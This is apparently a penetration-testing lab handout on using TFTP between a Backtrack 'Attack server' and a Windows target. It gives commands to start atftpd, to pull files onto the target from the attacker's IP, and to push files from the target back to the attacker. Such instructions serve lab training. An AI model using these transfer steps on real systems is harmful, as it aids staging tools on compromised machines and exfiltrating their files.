TFTP Instructions
TFTP instructions:

On your Linux Attack server (old version of the attack server)

You need to start the TFTP service on your Attack server
K-Menu – Services – TFTPD – Start TFTPD
You will get a message saying that the service is running on port 69
Note that the directory TFTP pulls from is /tmp, any file you want to transfer using TFTP needs to be in this directory
On your Target server open a command prompt

Create a directory to place your files in
Execute the following command to upload your file from your Attack server to the Target server:
       i.     Tftp –i aaa.bbb.ccc.dde GET filename (where aaa.bbb.ccc.dde is your attack server IP address)
If you want to download a file from your target server to your Attack server, execute the following:
       i.     Tftp –i aaa.bbb.ccc.dde PUT filename (where aaa.bbb.ccc.dde is your attack server IP address)
 

On Backtrack 5 (installed from the disk) you may have to do the following to enable TFTP

install the program "atftpd". You can do this by typing the following in a terminal window:
apt-get install atftpd
Then, in the terminal window type:
atftpd --daemon --port 69 --bind-address linux_attack_server_ip_address /tmp
This activates the tftp daemon on port 69 and binds the program to your Linux attack server, and uses the /tmp directory for uploads and downloads.
